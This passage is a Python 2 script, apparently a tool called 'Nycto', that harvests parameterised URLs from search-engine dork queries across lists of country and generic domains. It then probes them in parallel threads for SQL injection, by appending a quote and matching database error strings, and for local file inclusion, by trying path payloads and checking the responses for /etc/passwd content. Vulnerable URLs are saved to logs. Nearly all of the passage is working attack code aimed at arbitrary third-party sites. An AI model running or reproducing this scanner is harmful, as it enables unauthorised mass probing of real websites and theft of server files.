           'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn',
           'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk',
           'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me',
           'mg', 'mh', 'mk', 'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr',
           'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'nc',
           'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz',
           'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn',
           'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru',
           'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj',
           'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy',
           'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm',
           'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug',
           'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi',
           'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw', 'com',
           'net', 'org','biz', 'gov', 'mil', 'edu', 'info', 'int', 'tel',
           'name', 'aero', 'xxx','asia', 'cat', 'coop', 'jobs', 'mobi', 'museum',
           'pro', 'travel'],'Default':['com','fr','net','edu','gov','info'],'Choose specific domain':[''],'Balcan':['al', 'bg', 'ro', 'gr', 'rs', 'hr',
           'tr', 'ba', 'mk', 'mv', 'me'],'TLD':['xxx','edu', 'gov', 'mil',
           'biz', 'cat', 'com', 'int','net', 'org', 'pro', 'tel', 'aero', 'asia',
           'coop', 'info', 'jobs', 'mobi', 'name', 'museum', 'travel']}
           
  
stecnt = 0
for k,v in domains.items():
  stecnt += 1
  print str(stecnt)+" - "+k
sitekey = raw_input("\nChoose your target  (if you don't know choose default) :  ")

if sitekey == "5":
  sitedomain = raw_input("\nChoose the specifics domain (e.g. fr or com...) for multiples domains separe with commas :  ")
  if "," in sitedomain:
    site = sitedomain.split(',')
    sitearray = site
  else:  
    sitearray = domains[domains.keys()[int(sitekey)-1]]
    sitearray[0] = sitedomain
else :
  sitearray = domains[domains.keys()[int(sitekey)-1]]


inurl = raw_input('\nEnter your dork (without "inurl") : ')
numthreads = raw_input('Enter no. of threads : ')
maxc = raw_input('Enter no. of pages   : ')
print "\nNumber of SQL errors :",len(sqlerrors)
print "Number of LFI paths  :",len(lfis)
print "Number of headers    :",len(header)
print "Number of domains    :",len(v)
print "domains              :",sitearray
print "Number of threads    :",numthreads
print "Number of pages      :",maxc
print "Timeout in seconds   :",timeout
print ""




def search(inurl, maxc):
  urls = []
  for site in sitearray:
    site = site.strip()
    page = 0
    try:
      while page < int(maxc):
	jar = cookielib.FileCookieJar("cookies")
	query = inurl+"+site:"+site
	results_web = 'http://www.search-results.com/web?q='+query+'&hl=en&page='+repr(page)+'&src=hmp'
	request_web =urllib2.Request(results_web)
	agent = random.choice(header)
	request_web.add_header('User-Agent', agent)
	opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
	text = opener_web.open(request_web).read()
	stringreg = re.compile('(?<=href=")(.*?)(?=")')
        names = stringreg.findall(text)
        page += 1
        for name in names:
	  if name not in urls:
	    if re.search(r'\(', name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
	      pass
	    elif re.search("google", name) or re.search("duckduckgo", name) or re.search("ixquick", name) or re.search("webcrawler", name) or re.search("dogpile", name) or re.search("yippy", name) or re.search("Bing", name) or re.search("youtube", name) or re.search("phpbuddy", name) or re.search("iranhack", name) or re.search("phpbuilder", name) or re.search("codingforums", name) or re.search("phpfreaks", name) or re.search("br.search.yahoo", name) or re.search("ajax.googleapis", name) or re.search("search.lycos", name) or re.search("gigablast", name) or re.search("web.search.naver", name) or re.search("dmoz", name) or re.search("%", name):
	      pass
	    else:
	      urls.append(name)
	percent = int((1.0*page/int(maxc))*100)
	urls_len = len(urls)
	sys.stdout.write("\rSite: %s | Nycto Collected urls: %s | Percent Done: %s | Current page no.: %s <> " % (site,repr(urls_len),repr(percent),repr(page)))
	sys.stdout.flush()
    except(KeyboardInterrupt):
      pass
  tmplist = []
  print "\n\n[+] URLS (unsorted): ",len(urls)
  for url in urls:
    try:
      host = url.split("/",3)
      domain = host[2]
      if domain not in tmplist and "=" in url:
	finallist.append(url)
	tmplist.append(domain)
	
    except:
      pass
  print "[+] URLS (sorted)  : ",len(finallist)
  return finallist

  
class injThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicINJ(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False
                
class lfiThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicLFI(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False
                
                
def ClassicINJ(url):
        EXT = "'"
        host = url+EXT
        try:
                source = urllib2.urlopen(host).read()
                for type,eMSG in sqlerrors.items():
                        if re.search(eMSG, source):
                                print G+"\n [+] FOUND URL:", O+host, R+"Error:", type
				logfile.write("\n"+host) 
				vuln.append(host)
				
				
                        else:
                                pass
        except:
                pass


def ClassicLFI(url):
  lfiurl = url.rsplit('=', 1)[0]
  if lfiurl[-1] != "=":
    lfiurl = lfiurl + "="
  for lfi in lfis:
    try:
      check = urllib2.urlopen(lfiurl+lfi.replace("\n", "")).read()
      if re.findall("root:x", check):
	print G+"\n [+] FOUND-URL: ", O+lfiurl+lfi
	lfi_log_file.write("\n"+lfiurl+lfi)
	vuln.append(lfiurl+lfi)
	break
    except:
      pass

def injtest():
  print G+"\n[+] Nycto is scanning sqli ..."
  print "[+] Can take a while ..."
  print "[!] Working ..."
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = usearch[x*i:(x+1)*i]
      if (z<m):
	sliced.append(usearch[int(numthreads)*i+z])
	z +=1
      thread = injThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()
      
def lfitest():
  print G+"\n[+] Nycto is scanning LFI ..."
  print "[+] Can take a while ..."
  print "[!] Working ..."
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = usearch[x*i:(x+1)*i]
      if (z<m):
	sliced.append(usearch[int(numthreads)*i+z])
	z +=1
      thread = lfiThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()
      

usearch = search(inurl,maxc)
menu = True
while menu == True:
  print G+"\n[1] SQLi Testing"
  print "[2] LFI Testing"
  print "[3] SQLi and LFI Testing"
  print "[4] Save valid urls to file"
  print "[5] Print valid urls"
  print "[6] Found vuln in last scan"
  print "[0] Exit\n"
  chce = raw_input(":")
  if chce == '1':
    injtest()
      
  if chce == '2':
    lfitest()
    
  if chce == '3':
    injtest()
    lfitest()
    
  if chce == '4':
    print G+"\n Saving valid urls ("+str(len(finallist))+") to file"
    listname = raw_input("Filename: ")
    list_name = open(listname, "w")
    finallist.sort()
    for t in finallist:
      list_name.write(t+"\n")
    list_name.close()
    print "Urls saved, please check", listname
   
  if chce == '5':
    print W+"\n Printing valid urls:\n"
    finallist.sort()
    for t in finallist:
      print B+t
      
  if chce == '6':
    print G+"\n Vuln found ",len(vuln)

  if chce == '0':
    print R+"\n[-] Nycto is  Exiting ..."
    mnu = False
    sys.exit(1)
 
